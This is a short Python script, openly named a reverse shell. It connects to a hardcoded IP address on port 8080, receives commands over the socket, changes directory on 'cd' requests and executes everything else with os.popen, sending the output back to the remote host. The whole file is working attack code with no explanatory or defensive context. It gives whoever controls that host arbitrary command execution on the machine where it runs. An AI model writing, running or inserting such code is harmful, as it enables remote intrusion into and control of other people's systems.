#!/usr/bin/python
import socket, os

reverse_shell = socket.socket()
host = '10.174.15.32'
port = 8080 


reverse_shell.connect((host, port))
while True:
    cmd = reverse_shell.recv(1024)
    if cmd[:2] == "cd":
        
        os.chdir(str(cmd[3:]))
        reverse_shell.send('Directory changed...\n')
    else:
        output = os.popen(cmd).read()
        reverse_shell.send(output)